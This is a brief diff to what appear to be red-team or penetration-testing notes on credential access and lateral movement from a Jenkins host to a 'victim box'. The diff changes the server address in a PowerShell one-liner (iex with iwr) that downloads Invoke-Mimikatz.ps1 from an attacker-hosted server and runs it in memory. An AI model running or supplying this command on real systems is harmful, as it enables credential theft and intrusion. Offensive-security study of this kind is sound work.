@@ -9,7 +9,7 @@ Credential Vault
 Host Invoke-Mimikatz.ps1 on server
 
 ```
-iex (iwr http://172.16.100.49/Invoke-Mimikatz.ps1 -UseBasicParsing)
+iex (iwr http://172.1.1.4/Invoke-Mimikatz.ps1 -UseBasicParsing)
 
 ```
 ### Create session from Jenkins host to new victim box
